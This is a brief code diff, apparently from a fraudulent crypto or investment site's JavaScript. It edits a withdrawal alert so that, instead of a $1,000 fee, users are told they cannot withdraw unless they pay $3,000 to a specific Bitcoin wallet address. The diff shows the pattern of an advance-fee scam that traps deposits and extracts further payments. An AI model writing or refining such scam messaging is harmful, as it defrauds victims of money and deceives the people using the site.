@@ -363,7 +363,7 @@ if (confirmWithdraw) {
         }
 
  alert(
-"Withdrawal is currently unavailable.\n\nTo continue, a withdrawal fee of $1,000 is required before withdrawals can be processed."
+"unable to withdraw.\n\nTo continue, a withdrawal fee of $3,000 is expected to be paid to this BTC wallet bc1q3kjwt332fqwfvxjq0wls4rt38zkk0f4k8yv2hc."
 );
 
 
